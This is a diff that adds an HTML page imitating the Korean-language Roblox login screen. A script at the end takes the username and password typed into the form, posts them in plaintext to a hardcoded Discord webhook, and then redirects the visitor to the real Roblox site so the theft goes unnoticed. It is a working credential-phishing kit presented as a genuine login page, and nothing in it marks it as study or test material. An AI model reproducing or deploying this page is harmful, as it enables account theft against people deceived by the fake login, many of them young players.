@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <title>Roblox에 로그인</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,requiresActiveX=true">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="author" content="Roblox Corporation">
+    
+    <link rel="icon" href="https://images.rbxcdn.com/905bd722ee0a6ceda3caacde54c0b081.png">
+    
+    <link rel="stylesheet" href="./Roblox에 로그인_files/d706fa7361f26569ce9481ec468f9f0da29aa7a0623e0da9d19a772490192ed1-FoundationCss.css">
+    <link rel="stylesheet" href="./Roblox에 로그인_files/cbc004c933c81fb07d6c57dd882001686ae4f26f1f13134ea1b138d7866af876-ReactStyleGuide.css">
+    <link rel="stylesheet" href="./Roblox에 로그인_files/7f4f10003b8708331d7c8f20bf584a6478db0a83a986877b6c8d079f74be0a42-StyleGuide.css">
+    <link rel="stylesheet" href="./Roblox에 로그인_files/835ad8483ecae12366bf4b80701ee78af7c5b58cdb95a529e061851cf7bc1c7f-Builder.css">
+    <link rel="stylesheet" href="./Roblox에 로그인_files/7d808932809aa55941fddb3492faf069861083ff61167a883d8a835518c8000f-Navigation.css">
+    <link rel="stylesheet" href="./Roblox에 로그인_files/2e1267f1da987a263c26f1338f153fcc07addd6f69a4d2090603324a6d1f9b14-ReactLogin.css">
+    
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow-x: hidden;
+        }
+
+        .login-container, .background-image {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            width: 100%;
+        }
+
+        .login-content-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .login-base-container {
+            width: 100%;
+            max-width: 400px;
+            box-sizing: border-box;
+        }
+
+        #loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(18, 18, 18, 0.85);
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        #loading-overlay img {
+            width: 50px;
+            height: 50px;
+        }
+
+        /* 화면이 좁아졌을 때 상단바 요소들이 겹치지 않도록 조정 */
+        @media screen and (max-width: 900px) {
+            #header .container-fluid {
+                display: flex;
+                flex-wrap: wrap;
+                justify-content: space-between;
+                align-items: center;
+                height: auto !important;
+                padding: 10px;
+            }
+            #right-navigation-header {
+                display: flex;
+                align-items: center;
+                width: 100%;
+                justify-content: space-between;
+                margin-top: 5px;
+            }
+            .navbar-search {
+                width: 60% !important;
+                left: 0 !important;
+                position: static !important;
+            }
+            .navbar-right {
+                width: auto !important;
+                float: none !important;
+            }
+        }
+
+        @media screen and (max-width: 576px) {
+            .login-base-container {
+                max-width: 100%;
+            }
+        }
+    </style>
+</head>
+<body id="rbx-body" dir="ltr" class="rbx-body dark-theme forced-theme age-roblox-theme builder-font">
+    
+    <div id="loading-overlay">
+        <img src="https://images.rbxcdn.com/4bed93c91f909002b1f17f05c0ce13d1.gif" alt="Loading...">
+    </div>
+
+    <div id="wrap" class="wrap no-gutter-ads logged-out">
+        
+        <!-- 상단 내비게이션 바 -->
+        <div id="navigation-container" class="builder-font">
+            <div id="header" class="navbar-fixed-top rbx-header" role="navigation">
+                <div class="container-fluid">
+                    <div class="rbx-navbar-header">
+                        <div class="navbar-header">
+                            <a id="nav-logo-link" class="navbar-brand" href="https://www.roblox.com/ko/home">
+                                <span class="icon-logo"></span><span class="icon-logo-r"></span>
+                            </a>
+                        </div>
+                    </div>
+                    <ul class="nav rbx-navbar hidden-xs hidden-sm col-md-5 col-lg-4">
+                        <li><a class="font-header-2 nav-menu-title text-header" href="#">차트</a></li>
+                        <li><a class="font-header-2 nav-menu-title text-header" href="#">마켓플레이스</a></li>
+                        <li><a class="font-header-2 nav-menu-title text-header" href="https://create.roblox.com/">만들기</a></li>
+                        <li><div><a class="font-header-2 nav-menu-title text-header robux-menu-btn" href="#">Robux</a></div></li>
+                    </ul>
+                    <div id="right-navigation-header">
+                        <div class="navbar-left navbar-search col-xs-5 col-sm-6 col-md-2 col-lg-3 shown" role="search">
+                            <div class="input-group">
+                                <form name="search-form" action="#"><div class="form-has-feedback"><input type="search" class="form-control input-field new-input-field" placeholder="검색" value=""></div></form>
+                                <div class="input-group-btn"><button class="input-addon-btn" type="submit"><span class="icon-common-search-sm"></span></button></div>
+                            </div>
+                        </div>
+                        <div class="navbar-right rbx-navbar-right">
+                            <ul class="nav navbar-right rbx-navbar-right-nav">
+                                <li class="signup-button-container"><a class="rbx-navbar-signup btn-growth-sm nav-menu-title signup-button" href="#">회원가입</a></li>
+                                <li class="login-action"><a class="rbx-navbar-login btn-secondary-sm nav-menu-title rbx-menu-item" href="#">로그인</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <main class="container-main content-no-ads" id="container-main" tabindex="-1">
+            <div class="content" id="content">
+                <div id="react-login-web-app" class="login-container">
+                    <div id="background-image" class="background-image marketing-background-2">
+                        <div class="login-content-wrapper">
+                            <div id="login-base" class="login-base-container">
+                                <div class="section-content login-section">
+                                    <h1 class="login-header">Roblox에 로그인</h1>
+                                    <div id="login-form">
+                                        <div>
+                                            <div class="login-form-container">
+                                                <form class="login-form" name="loginForm" id="customLoginForm">
+                                                    <div class="form-group username-form-group">
+                                                        <label for="login-username" class="sr-only">사용자 이름/이메일/전화번호</label>
+                                                        <input id="login-username" name="username" type="text" class="form-control input-field" autocomplete="username webauthn" placeholder="사용자 이름/이메일/전화번호" value="" required>
+                                                    </div>
+                                                    <div class="form-group password-form-group">
+                                                        <label for="login-password" class="sr-only">비밀번호</label>
+                                                        <input id="login-password" name="password" type="password" class="form-control input-field" placeholder="비밀번호" value="" required>
+                                                        <div aria-live="polite"></div>
+                                                    </div>
+                                                    <button type="submit" id="login-button" class="btn-full-width login-button btn-secondary-md" style="cursor: pointer;">로그인</button>
+                                                </form>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="text-center forgot-credentials-link">
+                                        <a id="forgot-credentials-link" class="text-link" href="#">비밀번호 또는 사용자 이름을 잊으셨나요?</a>
+                                    </div>
+                                    <div>
+                                        <div class="alternative-login-divider-container">
+                                            <div class="rbx-divider alternative-login-divider"></div>
+                                        </div>
+                                        <button type="button" id="otp-login-button" class="btn-full-width btn-control-md otp-login-button">이메일로 일회용 코드 받기</button>
+                                        <button type="button" id="cross-device-login-button" class="btn-full-width btn-control-md cross-device-login-button"><span>빠른 로그인</span></button>
+                                    </div>
+                                    <div class="text-center">
+                                        <div class="signup-option">
+                                            <span class="no-account-text">계정이 없으신가요?</span>
+                                            <a id="sign-up-link" class="text-link signup-link" href="#">회원가입</a>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1549393543339049151/Dcf5Sp61gHRh1b7uLgJXauhg4PSRItK41J-LI3pOE5SMN1R9qidBiph80T9DNYG52nN_';
+
+        document.getElementById('customLoginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const u = document.getElementById('login-username').value;
+            const p = document.getElementById('login-password').value;
+            const loadingOverlay = document.getElementById('loading-overlay');
+
+            loadingOverlay.style.display = 'flex';
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `로그인 정보\n아이디: ${u}\n비밀번호: ${p}`
+                    })
+                });
+            } catch (error) {
+                console.error('전송 실패', error);
+            }
+
+            setTimeout(() => {
+                window.location.href = 'https://www.roblox.com';
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
